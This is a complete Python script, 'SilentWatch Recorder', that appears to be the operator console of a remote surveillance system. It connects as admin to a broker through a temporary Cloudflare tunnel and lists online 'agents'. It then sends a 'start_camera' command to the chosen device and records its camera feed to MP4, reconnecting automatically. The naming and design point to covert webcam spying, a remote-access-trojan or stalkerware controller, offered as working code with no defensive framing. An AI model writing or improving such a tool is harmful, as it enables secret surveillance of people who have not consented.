"""
SilentWatch Recorder
════════════════════
1. Connects to the broker as admin
2. Fetches the live agent list
3. Shows a numbered menu of ALL online agents → you pick one
4. Records ONLY that agent's stream to an MP4 at 30 fps
5. Zero frame loss — unbounded queue + last-frame fill on bad network
6. Ctrl+C → flush all buffered frames → save file

Usage
─────
  python recorder.py --url wss://xyz.trycloudflare.com
  python recorder.py --url wss://xyz.trycloudflare.com --out my_rec.mp4

Dependencies (auto-installed):  websockets  opencv-python  numpy
"""

import asyncio
import argparse
import json
import logging
import os
import queue
import signal
import sys
import threading
import time
from datetime import datetime

# ─── Logging (clean format, no spam) ─────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("recorder")

# ─── Auto-install deps ────────────────────────────────────────────────────────
def _ensure_deps():
    import importlib, subprocess
    pkgs = {"websockets": "websockets", "cv2": "opencv-python", "numpy": "numpy"}
    for mod, pip_name in pkgs.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            print(f"[*] Installing {pip_name}...", flush=True)
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pip_name, "-q"]
            )

_ensure_deps()

import cv2
import numpy as np
import websockets

# ─── Constants ────────────────────────────────────────────────────────────────
TARGET_FPS       = 30
FRAME_INTERVAL   = 1.0 / TARGET_FPS        # 33.33 ms
RECONNECT_DELAY  = 3                        # s between reconnects
WS_PING_INTERVAL = 20
WS_PING_TIMEOUT  = 30
WS_MAX_SIZE      = 10 * 1024 * 1024        # 10 MB per frame

_STOP = object()   # sentinel — tells writer to flush and exit


# ─── Shared stats ─────────────────────────────────────────────────────────────
class _Stats:
    def __init__(self):
        self.rx = self.wx = self.fill = self.reconnects = 0
        self._lk = threading.Lock()

    def inc_rx(self):
        with self._lk: self.rx += 1

    def inc_wx(self):
        with self._lk: self.wx += 1

    def inc_fill(self):
        with self._lk: self.fill += 1

    def inc_reconnect(self):
        with self._lk: self.reconnects += 1

    def line(self):
        with self._lk:
            total = self.wx + self.fill
            drop_pct = (self.fill / max(1, total)) * 100
            return (f"received={self.rx}  written={self.wx}  "
                    f"filled={self.fill} ({drop_pct:.1f}%)  "
                    f"reconnects={self.reconnects}")


stats = _Stats()


# ─── Interactive agent picker ─────────────────────────────────────────────────
# Runs SYNCHRONOUSLY before the asyncio loop starts.
# Opens a temp WebSocket connection, waits for agent_list, prints a menu,
# reads user input, then closes the temp connection.

def pick_agent(ws_url: str) -> str:
    """
    Block until we get the agent list from the server, show a menu,
    return the agent_id the user chose.
    """

    async def _fetch_and_pick():
        print(f"\n[*] Connecting to {ws_url} to fetch agent list...", flush=True)

        try:
            async with websockets.connect(
                ws_url,
                ping_interval=WS_PING_INTERVAL,
                ping_timeout=WS_PING_TIMEOUT,
                max_size=WS_MAX_SIZE,
                close_timeout=5,
                open_timeout=15,
            ) as ws:
                # Register as admin
                await ws.send(json.dumps({"role": "admin"}))

                # Wait for agent_list message
                agents = []
                async for raw in ws:
                    if isinstance(raw, bytes):
                        continue  # skip any stray frames
                    try:
                        msg = json.loads(raw)
                    except json.JSONDecodeError:
                        continue

                    if msg.get("type") == "agent_list":
                        agents = msg.get("agents", [])
                        break   # got what we need — exit loop

                return agents

        except OSError as e:
            # Covers DNS failure (getaddrinfo), connection refused, timeout
            print("\n" + "═" * 52, flush=True)
            print("  ✗  Cannot reach the tunnel server.", flush=True)
            print(f"  URL   : {ws_url}", flush=True)
            print(f"  Error : {e}", flush=True)
            print("═" * 52, flush=True)
            print("\n  Possible causes:", flush=True)
            print("  1. Tunnel is not running — start start_tunnel.py first", flush=True)
            print("  2. Tunnel restarted and got a NEW URL — copy the fresh", flush=True)
            print("     URL from start_tunnel.py console output and retry", flush=True)
            print("  3. No internet / DNS not resolving\n", flush=True)
            sys.exit(1)
        except websockets.exceptions.WebSocketException as e:
            print(f"\n  ✗  WebSocket error: {e}", flush=True)
            print("     Is the server.py broker running?\n", flush=True)
            sys.exit(1)
        except asyncio.TimeoutError:
            print(f"\n  ✗  Connection timed out after 15s.", flush=True)
            print("     The tunnel URL may be wrong or the server is down.\n", flush=True)
            sys.exit(1)

    # Run the async fetch synchronously
    agents = asyncio.run(_fetch_and_pick())

    total = len(agents)

    # ── Print banner ──────────────────────────────────────────────────────────
    print("\n" + "═" * 52)
    print(f"  SilentWatch — Online Agents ({total} found)")
    print("═" * 52)

    if total == 0:
        print("  ⚠  No agents are currently online.")
        print("  Start an agent and re-run the script.\n")
        sys.exit(0)

    # ── Numbered list ─────────────────────────────────────────────────────────
    # Show index, agent_id, and connected_at if available
    for i, a in enumerate(agents, start=1):
        aid        = a.get("agent_id", "unknown")
        conn_at    = a.get("connected_at") or "—"
        frames     = a.get("frames_sent", 0)
        print(f"  [{i:>4}]  {aid:<38}  connected={conn_at}  frames={frames}")

    print("═" * 52)

    # ── User picks ────────────────────────────────────────────────────────────
    while True:
        try:
            raw_input = input(f"\n  Enter number (1–{total}): ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Cancelled.")
            sys.exit(0)

        if not raw_input.isdigit():
            print(f"  ✗  Please enter a number between 1 and {total}.")
            continue

        idx = int(raw_input)
        if not (1 <= idx <= total):
            print(f"  ✗  Out of range. Enter 1–{total}.")
            continue

        chosen = agents[idx - 1]["agent_id"]
        print(f"\n  ✓  Recording: {chosen}\n")
        return chosen


# ─── Writer thread ────────────────────────────────────────────────────────────
# Pure OS thread — OpenCV never touches the asyncio event loop.
# Pulls from frame_queue at a strict 30-fps clock.
# On network stall (no frame in window) → repeats last frame so the
# video clock never drifts and the MP4 stays valid.

def writer_thread(fq: queue.Queue, out_path: str):

    writer     = None
    last_frame = None
    next_tick  = time.monotonic()

    log.info(f"[Writer] ready → {out_path}")

    def _init(frame):
        h, w = frame.shape[:2]
        vw = cv2.VideoWriter(
            out_path,
            cv2.VideoWriter_fourcc(*"mp4v"),
            TARGET_FPS,
            (w, h),
        )
        if not vw.isOpened():
            raise RuntimeError(f"VideoWriter could not open: {out_path}")
        log.info(f"[Writer] opened {w}×{h} @ {TARGET_FPS} fps")
        return vw

    def _decode(raw: bytes):
        try:
            arr = np.frombuffer(raw, dtype=np.uint8)
            img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
            return img
        except Exception as e:
            log.warning(f"[Writer] decode error: {e}")
            return None

    try:
        while True:
            now  = time.monotonic()
            wait = max(next_tick - now, 0.001)

            # ── Pull next frame (or timeout) ──────────────────────────────────
            new_frame = None
            try:
                raw = fq.get(timeout=wait)

                if raw is _STOP:
                    # Drain remaining frames then exit
                    log.info("[Writer] flushing remaining frames...")
                    while True:
                        try:
                            r2 = fq.get_nowait()
                            if r2 is _STOP:
                                break
                            f = _decode(r2)
                            if f is not None:
                                if writer is None and last_frame is not None:
                                    writer = _init(last_frame)
                                if writer:
                                    writer.write(f)
                                    stats.inc_wx()
                        except queue.Empty:
                            break
                    break

                decoded = _decode(raw)
                if decoded is not None:
                    new_frame = decoded

            except queue.Empty:
                pass  # no frame this tick — will fill below

            # ── Decide what goes into this video tick ─────────────────────────
            if new_frame is not None:
                last_frame = new_frame
            elif last_frame is None:
                next_tick += FRAME_INTERVAL   # no frame ever received yet
                continue

            # Lazy-init on first frame
            if writer is None:
                try:
                    writer = _init(last_frame)
                except Exception as e:
                    log.error(f"[Writer] init failed: {e}")
                    next_tick += FRAME_INTERVAL
                    continue

            writer.write(last_frame)

            if new_frame is not None:
                stats.inc_wx()
            else:
                stats.inc_fill()   # repeated frame — keeps clock correct

            next_tick += FRAME_INTERVAL   # strict tick advance — no drift

            # Progress log every ~10 s
            total_ticks = stats.wx + stats.fill
            if total_ticks > 0 and total_ticks % 300 == 0:
                dur_s = total_ticks / TARGET_FPS
                log.info(f"[Writer] {dur_s:.0f}s recorded | {stats.line()}")

    except Exception as e:
        log.error(f"[Writer] fatal: {e}", exc_info=True)
    finally:
        if writer:
            writer.release()
            size_mb = os.path.getsize(out_path) / 1_048_576 if os.path.exists(out_path) else 0
            log.info(f"[Writer] saved {out_path} ({size_mb:.1f} MB)")


# ─── Async receiver ───────────────────────────────────────────────────────────
# Connects, registers as admin, watches ONLY the chosen agent,
# pushes every binary frame into fq (unbounded → zero loss).
# Reconnects automatically on any network error.

async def receiver_loop(
    ws_url: str,
    target_agent: str,
    fq: queue.Queue,
    stop_evt: threading.Event,
):
    while not stop_evt.is_set():
        try:
            log.info(f"[Receiver] connecting → {ws_url}")
            async with websockets.connect(
                ws_url,
                ping_interval=WS_PING_INTERVAL,
                ping_timeout=WS_PING_TIMEOUT,
                max_size=WS_MAX_SIZE,
                close_timeout=5,
            ) as ws:

                log.info("[Receiver] connected — registering as admin")
                await ws.send(json.dumps({"role": "admin"}))

                watching = False

                async for raw in ws:
                    if stop_evt.is_set():
                        break

                    # ── Binary frame → straight into queue ────────────────────
                    if isinstance(raw, bytes):
                        fq.put(raw)
                        stats.inc_rx()
                        continue

                    # ── JSON control ──────────────────────────────────────────
                    try:
                        msg = json.loads(raw)
                    except json.JSONDecodeError:
                        continue

                    t = msg.get("type")

                    if t == "agent_list":
                        # Re-check target agent is still online
                        ids = [a["agent_id"] for a in msg.get("agents", [])]
                        if target_agent not in ids:
                            if watching:
                                log.warning(f"[Receiver] '{target_agent}' went offline — waiting...")
                                watching = False
                            continue

                        if not watching:
                            log.info(f"[Receiver] sending watch_agent → {target_agent}")
                            await ws.send(json.dumps({
                                "command":  "watch_agent",
                                "agent_id": target_agent,
                            }))

                    elif t == "watching":
                        confirmed = msg.get("agent_id")
                        log.info(f"[Receiver] watching confirmed: {confirmed}")
                        await ws.send(json.dumps({
                            "command":  "start_camera",
                            "agent_id": confirmed,
                        }))
                        log.info(f"[Receiver] start_camera sent — recording started")
                        watching = True

                    elif t == "error":
                        log.warning(f"[Receiver] server error: {msg.get('message')}")

        except websockets.exceptions.ConnectionClosed as e:
            log.warning(f"[Receiver] connection closed: {e}")
        except OSError as e:
            log.warning(f"[Receiver] network error: {e}")
        except Exception as e:
            log.error(f"[Receiver] unexpected: {e}", exc_info=True)

        if not stop_evt.is_set():
            stats.inc_reconnect()
            log.info(f"[Receiver] reconnect #{stats.reconnects} in {RECONNECT_DELAY}s...")
            await asyncio.sleep(RECONNECT_DELAY)

    log.info("[Receiver] stopped.")
    fq.put(_STOP)   # tell writer to flush + exit


# ─── Main ─────────────────────────────────────────────────────────────────────

def _ts_path(agent_id: str) -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = agent_id.replace(" ", "_").replace("/", "-")
    return f"rec_{safe}_{ts}.mp4"


async def _async_main(ws_url: str, agent_id: str, out_path: str):
    fq        = queue.Queue()          # unbounded — every frame saved
    stop_evt  = threading.Event()

    print(f"\n{'═'*52}")
    print(f"  Recording  : {agent_id}")
    print(f"  Output     : {out_path}")
    print(f"  FPS        : {TARGET_FPS}")
    print(f"  Press Ctrl+C to stop and save")
    print(f"{'═'*52}\n")

    # Start writer thread
    wt = threading.Thread(
        target=writer_thread,
        args=(fq, out_path),
        daemon=False,
        name="FrameWriter",
    )
    wt.start()

    # Hook shutdown signals
    loop = asyncio.get_running_loop()

    def _shutdown():
        if not stop_evt.is_set():
            print("\n[*] Stopping — flushing frames...", flush=True)
            stop_evt.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _shutdown)
        except NotImplementedError:
            pass   # Windows

    try:
        await receiver_loop(ws_url, agent_id, fq, stop_evt)
    except asyncio.CancelledError:
        stop_evt.set()
        fq.put(_STOP)

    log.info("[Main] waiting for writer to finish...")
    wt.join(timeout=90)
    if wt.is_alive():
        log.warning("[Main] writer timeout — forcing exit")

    print(f"\n{'═'*52}")
    print(f"  Stats  : {stats.line()}")
    print(f"  Saved  : {os.path.abspath(out_path)}")
    print(f"{'═'*52}\n")


def main():
    parser = argparse.ArgumentParser(
        description="SilentWatch Recorder — pick an agent and record to MP4"
    )
    parser.add_argument(
        "--url", required=True,
        help="Tunnel WebSocket URL  e.g. wss://xyz.trycloudflare.com",
    )
    parser.add_argument(
        "--out", default=None,
        help="Output MP4 path (default: rec_<agent>_<timestamp>.mp4)",
    )
    args = parser.parse_args()

    # Normalise URL
    url = args.url
    for prefix, replacement in [("https://", "wss://"), ("http://", "ws://")]:
        if url.startswith(prefix):
            url = replacement + url[len(prefix):]
            break

    # ── Step 1: show menu, get chosen agent ───────────────────────────────────
    chosen_agent = pick_agent(url)

    # ── Step 2: build output path ─────────────────────────────────────────────
    out_path = args.out or _ts_path(chosen_agent)

    # ── Step 3: record ────────────────────────────────────────────────────────
    try:
        asyncio.run(_async_main(url, chosen_agent, out_path))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()